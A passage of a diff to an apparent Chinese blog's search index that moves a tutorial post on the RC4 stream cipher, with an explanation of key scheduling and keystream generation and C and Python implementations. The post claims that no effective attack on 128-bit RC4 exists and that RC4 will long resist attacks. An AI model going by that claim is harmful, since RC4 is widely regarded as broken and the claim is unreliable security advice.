Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">&quot;justfortest&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">&quot;这是一个用来加密的数据Data&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s,length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));<span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;完成对S[i]的初始化，如下：\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)<span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经初始化，现在加密:\n\n&quot;</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经加密，现在解密:\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//程序完</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="2、Python"><a href="#2、Python" class="headerlink" title="2、Python"></a>2、Python</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rc4.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    length = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        T.append(key[i % length])</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_encrypt</span>(<span class="params">s_box, data</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4加密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4加密后(Base64编码)的字c符串是:&quot;</span> + <span class="built_in">str</span>(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_decrypt</span>(<span class="params">s_box, data</span>):</span></span><br><span class="line">    data = base64.b64decode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    data = <span class="built_in">bytes</span>.decode(data)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">from</span> rc4 <span class="keyword">import</span> rc4_init_sbox, rc4_encrypt, rc4_decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        function = <span class="built_in">input</span>(<span class="string">&quot;E to encrypt or D to decrypt for rc4:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> function.upper() == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            data = <span class="built_in">input</span>(<span class="string">&quot;请输入你要进行RC4加密的数据：&quot;</span>)</span><br><span class="line">            key = <span class="built_in">input</span>(<span class="string">&quot;请输入RC4加密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_encrypt(s_box, data)</span><br><span class="line">        <span class="keyword">elif</span> function.upper() == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            data = <span class="built_in">input</span>(<span class="string">&quot;请输入你要进行RC4解密的数据：&quot;</span>)</span><br><span class="line">            key = <span class="built_in">input</span>(<span class="string">&quot;请输入RC4解密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_decrypt(s_box, data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入正确的功能&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>参考链接：</p>
-<ul>
-<li><p><a href="https://www.cnblogs.com/gambler/p/9075415.html">https://www.cnblogs.com/gambler/p/9075415.html</a></p>
-</li>
-<li><p><a href="https://www.cnblogs.com/block2016/p/5601925.html">https://www.cnblogs.com/block2016/p/5601925.html</a></p>
-</li>
-<li><p><a href="https://www.jianshu.com/p/d9ad5fc524ec">https://www.jianshu.com/p/d9ad5fc524ec</a></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>密码学</category>
-      </categories>
-      <tags>
-        <tag>密码学</tag>
       </tags>
   </entry>
   <entry>
@@ -3340,6 +3279,67 @@
         <tag>钓鱼</tag>
         <tag>社工</tag>
         <tag>APT</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RC4加密算法</title>
+    <url>/post/9dd1bdb.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;RC4加密算法是一种对称加密算法</p>
+<h1 id="一、对称加密算法"><a href="#一、对称加密算法" class="headerlink" title="一、对称加密算法"></a>一、对称加密算法</h1><p>&emsp;&emsp;对称加密(也叫私钥加密)指加密和解密使用相同<a href="http://baike.baidu.com/view/934.htm">密钥</a>的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。它要求发送方和接收方在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都可以对他们发送或接收的消息解密，所以密钥的保密性对通信的安全性至关重要。 </p>
+<h1 id="二、RC4加密算法"><a href="#二、RC4加密算法" class="headerlink" title="二、RC4加密算法"></a>二、RC4加密算法</h1><h2 id="1、预备知识"><a href="#1、预备知识" class="headerlink" title="1、预备知识"></a>1、预备知识</h2><h3 id="（1）异或"><a href="#（1）异或" class="headerlink" title="（1）异或"></a>（1）异或</h3><p>&emsp;&emsp;学习RC4加密算法之前，首先要知道：<strong>对明文使用同一个密钥异或两次最后是得到原文的</strong></p>
+<h3 id="（2）流密码"><a href="#（2）流密码" class="headerlink" title="（2）流密码"></a>（2）流密码</h3><h4 id="①-定义"><a href="#①-定义" class="headerlink" title="① 定义"></a>① 定义</h4><p>&emsp;&emsp;流密码是对称密码算法，从明文输入流逐位或逐字节产生密文输出。</p>
+<p>&emsp;&emsp;流密码类似于“一次一密”，不同的是“一次一密”使用的是真正的随机数流，而流密码使用的是伪随机数流。</p>
+<h4 id="②-实例"><a href="#②-实例" class="headerlink" title="② 实例"></a>② 实例</h4><p>&emsp;&emsp;使用最广泛的流密码是RC4</p>
+<h4 id="③-流密码结构"><a href="#③-流密码结构" class="headerlink" title="③ 流密码结构"></a>③ 流密码结构</h4><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015605787-f3c732e3-7fb2-42bf-ad9a-46141b10a8b1.png" alt="img"></p>
+<h4 id="④-设计流密码的主要因素"><a href="#④-设计流密码的主要因素" class="headerlink" title="④ 设计流密码的主要因素"></a>④ 设计流密码的主要因素</h4><ol>
+<li><p>加密序列的周期要长，若出现重复的周期过短，容易被破解</p>
+</li>
+<li><p>密钥流应该尽可能地接近真正随机数流的特征</p>
+</li>
+<li><p>密钥长度要长，以避免穷举攻击</p>
+</li>
+</ol>
+<h2 id="2、RC4算法介绍"><a href="#2、RC4算法介绍" class="headerlink" title="2、RC4算法介绍"></a>2、RC4算法介绍</h2><p>&emsp;&emsp;RC4算法是Ron Rivest为RSA公司在1987年设计的一种流密码，作为RSA的商业机密直到1994年才被匿名公布于Internet。</p>
+<p>&emsp;&emsp;该算法是一个可变密钥长度、面向字节操作的流密码。该算法以<strong>随机置换</strong>作为<strong>基础</strong>，其密码周期很可能大于10100，且该算法的运行速度很快。</p>
+<p>&emsp;&emsp;RC4被用于为网络浏览器和服务器间通信而制定的SSL/TLS（安全套接字协议/传输层安全协议）标准中，以及作为IEEE 801.11无线局域网标准一部分的WEP(Wired Equivalent Privacy)协议和新的WiFi受保护访问协议（WPA）中<strong>。****从这些应用来看，RC4构成了当今网络通信的非常重要的部分，因此这个算法非常重要。</strong></p>
+<p>&emsp;&emsp;RC4算法的特点是算法简单，运行速度快，而且密钥长度是可变的，可变范围为1-256字节(8-2048比特)，在如今技术支持的前提下，当密钥长度为128比特时，用暴力法搜索密钥已经不太可行，所以可以预见RC4的密钥范围任然可以在今后相当长的时间里抵御暴力搜索密钥的攻击。实际上，如今也没有找到对于128bit密钥长度的RC4加密算法的有效攻击方法。  </p>
+<h2 id="3、RC4加密原理"><a href="#3、RC4加密原理" class="headerlink" title="3、RC4加密原理"></a>3、RC4加密原理</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015993488-6e14d89f-c789-4c1b-b5b2-5c431304f2d9.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638018567039-e5fed088-41f6-4467-8f34-52543c690500.png" alt="img"></p>
+<p>&emsp;&emsp;RC4算法的原理很简单，包括<strong>初始化算法（KSA）</strong>和**伪随机子密码生成算法（PRGA)**两大部分。</p>
+<h3 id="（1）初始化算法（KSA）"><a href="#（1）初始化算法（KSA）" class="headerlink" title="（1）初始化算法（KSA）"></a>（1）初始化算法（KSA）</h3><h4 id="①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）"><a href="#①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）" class="headerlink" title="① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）"></a>① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）</h4><p>&emsp;&emsp;按照升序，给每个字节赋值0,1,2,3,4,5,6……,254,255</p>
+<h4 id="②-初始密钥（由用户输入），长度任意"><a href="#②-初始密钥（由用户输入），长度任意" class="headerlink" title="② 初始密钥（由用户输入），长度任意"></a>② 初始密钥（由用户输入），长度任意</h4><p>&emsp;&emsp;建立一个临时向量T。将密钥的值循环复制到T向量如果输入长度小于256个字节，则进行轮转，直到填满</p>
+<ul>
+<li>例如输入密钥的是1,2,3,4,5，那么填入的是1,2,3,4,5,1,2,3,4,5,1,2,3,4,5……</li>
+</ul>
+<p>&emsp;&emsp;<strong>由上述轮转过程得到256个字节的向量T（用来作为密钥流生成的种子2）</strong></p>
+<h4 id="③-开始对状态向量S进行置换操作（用来打乱初始种子1）"><a href="#③-开始对状态向量S进行置换操作（用来打乱初始种子1）" class="headerlink" title="③ 开始对状态向量S进行置换操作（用来打乱初始种子1）"></a>③ 开始对状态向量S进行置换操作（用来打乱初始种子1）</h4><p>&emsp;&emsp;按照下列规则进行，从第零个字节开始，执行256次，保证每个字节都得到处理</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">    j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">    swap(S[i],S[j]);</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;因为对S的操作仅是交换，S仍然包含所有值为0-255的元素。</p>
+<h3 id="（3）密钥流的生成与加密"><a href="#（3）密钥流的生成与加密" class="headerlink" title="（3）密钥流的生成与加密"></a>（3）密钥流的生成与加密</h3><p>&emsp;&emsp;假设我的明文字节数是datalength=1024个字节（当然可以是任意个字节）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>;</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123; <span class="comment">// 相当于执行1024次，这样生成的密钥流也是1024个字节</span></span><br><span class="line">    i = (i+<span class="number">1</span>)mod256;</span><br><span class="line">    j = (j+S[i])mod256;</span><br><span class="line">    swap(S[i],S[j]);</span><br><span class="line">    t = (S[i]+S[j])mod256;</span><br><span class="line">    k = S[t]; 这里的k就是当前生成的一个密钥流中的一位</span><br><span class="line">    <span class="comment">// 可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或就ok</span></span><br><span class="line">    data[] = data[]^k;  <span class="comment">// 进行加密，^是异或运算符</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;解密按照前面写的，异或两次就是原文，所以只要把密钥流重新拿过来异或一次就能得到原文了</p>
+<h1 id="三、完整算法实现"><a href="#三、完整算法实现" class="headerlink" title="三、完整算法实现"></a>三、完整算法实现</h1><h2 id="1、C"><a href="#1、C" class="headerlink" title="1、C"></a>1、C</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//程序开始</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">&quot;justfortest&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">&quot;这是一个用来加密的数据Data&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s,length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));<span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;完成对S[i]的初始化，如下：\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)<span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经初始化，现在加密:\n\n&quot;</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经加密，现在解密:\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//程序完</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2、Python"><a href="#2、Python" class="headerlink" title="2、Python"></a>2、Python</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rc4.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    length = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        T.append(key[i % length])</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_encrypt</span>(<span class="params">s_box, data</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4加密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4加密后(Base64编码)的字c符串是:&quot;</span> + <span class="built_in">str</span>(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_decrypt</span>(<span class="params">s_box, data</span>):</span></span><br><span class="line">    data = base64.b64decode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    data = <span class="built_in">bytes</span>.decode(data)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    